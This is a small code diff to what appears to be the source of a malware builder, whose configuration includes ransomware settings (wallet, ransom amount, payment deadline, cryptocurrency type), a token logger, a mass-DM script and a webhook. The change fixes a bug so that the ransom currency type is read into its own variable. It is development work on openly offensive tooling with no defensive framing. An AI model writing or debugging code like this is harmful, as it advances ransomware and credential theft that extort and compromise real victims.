@@ -145,6 +145,7 @@ class Main:
         wallet = ''
         massdm_script = ''
         cost = 0
+        crypto_type = ''
         reboots_allowed = 0
         hours = 0
         webhook = ''
@@ -253,7 +254,7 @@ class Main:
                 hours = config['RANSOMWARE'][1]['PAYMENT_TIMELIMIT_IN_HOURS']
                 wallet = config['RANSOMWARE'][1]['WALLET']
                 cost = config['RANSOMWARE'][1]['RANSOM_AMOUNT']
-                hours = config['RANSOMWARE'][1]['CRYPTO_CURRENCY_TYPE']
+                crypto_type = config['RANSOMWARE'][1]['CRYPTO_CURRENCY_TYPE']
 
             token_logger = config['TOKEN_LOGGER'][0]
             if token_logger:
